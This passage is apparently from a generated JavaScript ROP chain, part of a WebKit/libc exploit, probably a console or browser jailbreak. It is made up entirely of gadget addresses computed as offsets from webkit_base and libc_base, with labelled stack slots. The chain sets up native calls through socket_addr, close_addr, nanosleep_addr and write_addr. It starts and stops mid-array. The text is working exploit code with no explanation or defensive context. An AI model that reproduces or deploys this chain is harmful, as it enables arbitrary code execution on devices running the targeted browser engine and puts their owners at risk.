ropchain+178872, //L2886-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+178856, //L2885-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2884:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2885:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2886:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+178960, //L2887-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2887:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+179016, //L2890-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2890:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+179104, //L2893-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2891:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+757614,); //pop rcx
//L2893:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2894:
db([4294967252, 4294967295]); // -0x2c
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+179248, //L2898-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+179232, //L2897-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2897:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2898:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+179416, //L2901-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+179432, //L2902-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+179384, //L2899-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+179400, //L2900-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2899:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2900:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2901:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2902:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+179528, //L2904-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+179512, //L2903-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2903:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2904:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+179624, //L2907-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2905:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+757614,); //pop rcx
//L2907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+179728, //L2910-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+179712, //L2909-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2909:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2910:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+179896, //L2913-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+179912, //L2914-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+179864, //L2911-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+179880, //L2912-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2911:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2912:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2913:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2914:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+180016, //L2915-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+180048, //L2917-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+180032, //L2916-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2915:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2916:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+180200, //L2919-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+180216, //L2920-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+180184, //L2918-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2918:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2919:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2920:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+180320, //L2923-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+180336, //L2924-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2921:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+757614,); //pop rcx
//L2923:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2924:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+180400, //L2927-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2927:
db([0, 0]); // 0x0
set_gadgets([
libc_base+766440, //pop rsp
ropchain+180456, //L2925
//L2785:
libc_base+766440, //pop rsp
ropchain+180472, //L2860
//L2925:
libc_base+766440, //pop rsp
ropchain+174464, //L2770
//L2860:
libc_base+362222, //pop rsi
ropchain+180512, //L2930-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2928:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+757614,); //pop rcx
//L2930:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+180616, //L2933-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+180600, //L2932-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2932:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2933:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+180784, //L2936-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+180800, //L2937-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+180752, //L2934-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+180768, //L2935-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2934:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2935:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2936:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2937:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+180896, //L2939-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+180880, //L2938-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2938:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2939:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2941:
ropchain+181016, //L2940
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+182496, //L2942
//L2940:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+181088, //L2944-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2943:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2944:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2945:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+181200, //L2946-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+181216, //L2947-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2946:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2947:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+181328, //L2948-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+181312, //L2949-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2949:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2948:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+181416, //L2951-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+181400, //L2950-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2950:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2951:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+181512, //L2952-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+181528, //L2953-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2952:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2953:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+181640, //L2954-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+181624, //L2955-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2955:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2954:
db([0, 0]); // 0x0
//L2687:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+182488, //L2956
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+182296, //L2957
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+182312, //L2958
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+182328, //L2959
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+182344, //L2960
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+182360, //L2961
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+182376, //L2962
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+182408, //L2963
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
socket_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+182400, //L2964
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+182456, //L2965
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+182472, //L2966
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L2957:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2958:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L2959:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2960:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2961:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L2962:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L2964:
db([0, 0]); // 0x0
//L2963:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+182440, //L2967
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L2967:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2965:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2966:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2956:
db([0, 0]); // 0x0
//L2942:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183320, //L2968
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183128, //L2969
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183144, //L2970
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183160, //L2971
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183176, //L2972
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183192, //L2973
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183208, //L2974
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+183240, //L2975
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
close_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+183232, //L2976
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+183288, //L2977
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+183304, //L2978
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L2969:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2970:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L2971:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2972:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2973:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L2974:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L2976:
db([0, 0]); // 0x0
//L2975:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+183272, //L2979
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L2979:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2977:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2978:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2968:
db([0, 0]); // 0x0
//L2680:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184152, //L2980
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183960, //L2981
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183976, //L2982
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+183992, //L2983
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184008, //L2984
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184024, //L2985
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184040, //L2986
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+184072, //L2987
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
nanosleep_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+184064, //L2988
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+184120, //L2989
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+184136, //L2990
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L2981:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2982:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L2983:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2984:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2985:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L2986:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L2988:
db([0, 0]); // 0x0
//L2987:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+184104, //L2991
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L2991:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2989:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2990:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2980:
db([0, 0]); // 0x0
//L2828:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184984, //L2992
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184792, //L2993
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184808, //L2994
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184824, //L2995
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184840, //L2996
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184856, //L2997
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+184872, //L2998
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+184904, //L2999
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
write_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+184896, //L3000
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+184952, //L3001
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+184968, //L3002
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L2993:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2994:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L2995:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2996:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2997:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L2998:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3000:
db([0, 0]); // 0x0
//L2999:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+184936, //L3003
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3003:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3001:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3002:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2992:
db([0, 0]); // 0x0
//L2745:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
